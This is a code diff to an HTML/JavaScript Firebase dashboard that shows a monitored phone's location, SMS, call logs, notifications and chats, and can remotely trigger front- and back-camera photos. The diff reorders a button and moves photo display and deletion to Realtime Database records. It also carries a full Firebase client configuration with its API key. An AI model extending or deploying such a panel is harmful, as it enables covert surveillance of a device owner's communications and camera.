@@ -463,6 +463,11 @@
 
             <div id="details-view">
                 <div class="category-buttons">
+                    <!-- Device Status को सबसे पहले लाया गया -->
+                    <button class="category-btn" data-category="devicestatus">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ce93d8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
+                        <span>Device Status</span>
+                    </button>
                     <button class="category-btn" data-category="location">
                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
                         <span>Location</span>
@@ -479,15 +484,9 @@
                          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#9b59b6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
                         <span>SMS</span>
                     </button>
-                     <!-- नया फीचर: कॉल लॉग्स -->
                     <button class="category-btn" data-category="calllogs">
                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#64b5f6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
                         <span>Call Logs</span>
-                    </button>
-                    <!-- नया फीचर: डिवाइस की स्थिति -->
-                    <button class="category-btn" data-category="devicestatus">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ce93d8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
-                        <span>Device Status</span>
                     </button>
                     <button class="category-btn" data-category="notifications">
                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
@@ -532,14 +531,15 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
         import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-auth.js";
         import { getDatabase, ref, onValue, remove, update, push, serverTimestamp, off } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
-        import { getStorage, ref as storageRef, listAll, getDownloadURL, getMetadata, deleteObject } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-storage.js";
+        // Storage is no longer needed for photos, but keep it for other potential uses.
+        import { getStorage, ref as storageRef, deleteObject } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-storage.js";
 
         const firebaseConfig = {
          apiKey: "AIzaSyBZ-E4_1bI4YN-1pt6xyMNXq1tOAvx0GY0",
          authDomain: "home-demo12-d5814.firebaseapp.com",
          databaseURL: "https://home-demo12-d5814-default-rtdb.firebaseio.com",
          projectId: "home-demo12-d5814",
-         storageBucket: "home-demo12-d5814.appspot.com",   
+         storageBucket: "home-demo12-d5814.appspot.com",
          messagingSenderId: "433464727867",
          appId: "1:433464727867:web:731cc791eb8d48c5d9bf1e",
          measurementId: "G-NHHB06Z9HT"
@@ -819,7 +819,7 @@
             
             document.getElementById('modal-title').textContent = `${category.charAt(0).toUpperCase() + category.slice(1)} Data`;
 
-            if (category === 'photo') { renderPhotosFromStorage(userId, childKey); return; }
+            if (category === 'photo') { renderPhotosFromDatabase(userId, childKey); return; }
             if (category === 'chat') { renderChat(userId, childKey); return; }
             
             const dataPath = `user/${userId}/${childKey}/${getCategoryPath(category)}`;
@@ -1070,24 +1070,51 @@
             modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
         }
         
-        async function renderPhotosFromStorage(userId, childKey) {
+        // --- बेहतर और लचीला फंक्शन: डेटाबेस से तस्वीरें दिखाएं ---
+        function renderPhotosFromDatabase(userId, childKey) {
             const headerHTML = `<div class="data-header"><button class="capture-photo-btn" data-facing="1"><span>Capture Front Photo</span></button><button class="capture-photo-btn" data-facing="0"><span>Capture Back Photo</span></button><button id="refresh-photos-btn"><span>Refresh</span></button><button class="clear-category-btn" data-category="photo"><span>Clear Photos</span></button></div>`;
             modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader"></div>';
-            try {
-                const photoDirRef = storageRef(storage, `user/${userId}/${childKey}/photo`);
-                const res = await listAll(photoDirRef);
-                if (res.items.length === 0) { modalDataDisplayArea.innerHTML = headerHTML + '<p>No photos available.</p>'; return; }
-                const photoPromises = res.items.map(itemRef => Promise.all([getDownloadURL(itemRef), getMetadata(itemRef)]));
-                const photosWithData = await Promise.all(photoPromises);
+
+            const photoDataRef = ref(db, `user/${userId}/${childKey}/photo/data`);
+            
+            const callback = (snapshot) => {
+                const photos = snapshot.val();
+                if (!photos || Object.keys(photos).length === 0) {
+                    modalDataDisplayArea.innerHTML = headerHTML + '<p>No photos available.</p>';
+                    return;
+                }
+
+                // नवीनतम तस्वीरों को पहले दिखाने के लिए ऑब्जेक्ट मानों को उलट दें
+                const photosWithData = Object.values(photos).reverse();
+
+                if (photosWithData.length === 0) {
+                    modalDataDisplayArea.innerHTML = headerHTML + '<p>No valid photo URLs found.</p>';
+                    return;
+                }
+
                 let photoGridHTML = '<div class="photo-grid">';
-                photosWithData.sort((a, b) => new Date(b[1].timeCreated) - new Date(a[1].timeCreated)).forEach(([url, metadata]) => {
-                    const timeCreated = new Date(metadata.timeCreated).toLocaleString('en-US');
-                    photoGridHTML += `<div class="photo-card"><img src="${url}" alt="Captured photo" onerror="this.onerror=null;this.src='https://placehold.co/200x180/2a2a2a/e0e0e0?text=Error';"><div class="photo-info"><span class="photo-time">${timeCreated}</span><a href="${url}" target="_blank" class="view-btn"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></a></div></div>`;
+                photosWithData.forEach(photoData => {
+                    // सुनिश्चित करें कि photoData एक ऑब्जेक्ट है और इसमें urlPhoto प्रॉपर्टी है
+                    if (typeof photoData === 'object' && photoData !== null && photoData.urlPhoto) {
+                        const url = photoData.urlPhoto; // सही प्रॉपर्टी का उपयोग करें
+                        const timeCreated = photoData.dateTime || 'N/A'; // सही प्रॉपर्टी का उपयोग करें
+                        photoGridHTML += `<div class="photo-card"><img src="${url}" alt="Captured photo" onerror="this.onerror=null;this.src='https://placehold.co/200x180/2a2a2a/e0e0e0?text=Error';"><div class="photo-info"><span class="photo-time">${timeCreated}</span><a href="${url}" target="_blank" class="view-btn"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></a></div></div>`;
+                    }
                 });
                 photoGridHTML += '</div>';
                 modalDataDisplayArea.innerHTML = headerHTML + photoGridHTML;
-            } catch (error) { console.error("Error fetching photos:", error); modalDataDisplayArea.innerHTML = headerHTML + `<p>Error loading photos. (Error Code: ${error.code})</p>`; }
+            };
+
+            // किसी भी पिछले लिसनर को हटाएं
+            if (activeDataListener) {
+                off(activeDataListener.ref, 'value', activeDataListener.callback);
+            }
+
+            // नया लिसनर संलग्न करें और उसे स्टोर करें
+            onValue(photoDataRef, callback);
+            activeDataListener = { ref: photoDataRef, callback: callback };
         }
+
 
         modalDataDisplayArea.addEventListener('click', (e) => {
             const button = e.target.closest('button');
@@ -1128,7 +1155,7 @@
             }
 
             if (button.id === 'refresh-photos-btn') { 
-                renderPhotosFromStorage(userId, childKey); 
+                renderPhotosFromDatabase(userId, childKey); 
             }
         });
 
@@ -1145,21 +1172,22 @@
             }
         }
         
+        // --- बेहतर क्लियर फंक्शन ---
         async function clearAllPhotos(userId, childKey) {
-            const photoStoragePath = `user/${userId}/${childKey}/photo`;
-            if (!confirm(`Are you sure you want to delete all photos for '${selectedUserInfo.userName}'? This cannot be undone.`)) return;
-            modalDataDisplayArea.innerHTML = '<div class="loader"></div><p>Deleting photos...</p>';
+            // पुष्टि (confirmation) इवेंट लिसनर में संभाली जाती है
+            modalDataDisplayArea.innerHTML = '<div class="loader"></div><p>Deleting photo records...</p>';
             try {
-                const photoDirRef = storageRef(storage, photoStoragePath);
-                const res = await listAll(photoDirRef);
-                await Promise.all(res.items.map(itemRef => deleteObject(itemRef)));
+                // सिर्फ Realtime Database से फोटो के रिकॉर्ड्स हटाएं।
+                // renderPhotosFromDatabase का सक्रिय onValue लिसनर अपने आप UI को अपडेट कर देगा।
                 await remove(ref(db, `user/${userId}/${childKey}/photo/data`));
-                alert('All photos have been deleted.');
-                renderPhotosFromStorage(userId, childKey);
-            } catch (error) { console.error("Error clearing photos:", error); alert("Error clearing photos."); renderPhotosFromStorage(userId, childKey); }
+                alert('All photo records have been deleted.');
+            } catch (error) {
+                console.error("Error clearing photo records:", error);
+                alert("An error occurred while deleting photo records.");
+                // यदि डिलीट करने में कोई त्रुटि होती है तो उपयोगकर्ता को वर्तमान स्थिति दिखाने के लिए फिर से रेंडर करें।
+                renderPhotosFromDatabase(userId, childKey);
+            }
         }
     </script>
 </body>
 </html>
-
-
